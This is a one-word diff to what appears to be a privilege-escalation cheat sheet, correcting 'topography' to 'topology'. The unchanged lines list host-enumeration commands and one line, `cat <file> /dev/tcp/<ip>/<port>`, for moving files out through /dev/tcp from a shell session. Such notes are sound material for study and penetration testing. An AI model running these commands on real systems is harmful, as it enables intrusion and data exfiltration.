@@ -44,7 +44,7 @@ Everything to check when trying to become root
     ```bash
     cat <json_file> | jq
     ```
-- `cat /proc/net/fib_trie` --> Shows network topography
+- `cat /proc/net/fib_trie` --> Shows network topology
 - `hostname` --> Shows domain name
 - `/etc/os-release` --> OS info and release
 - `cat <file> /dev/tcp/<ip>/<port>` --> Download file from shell session
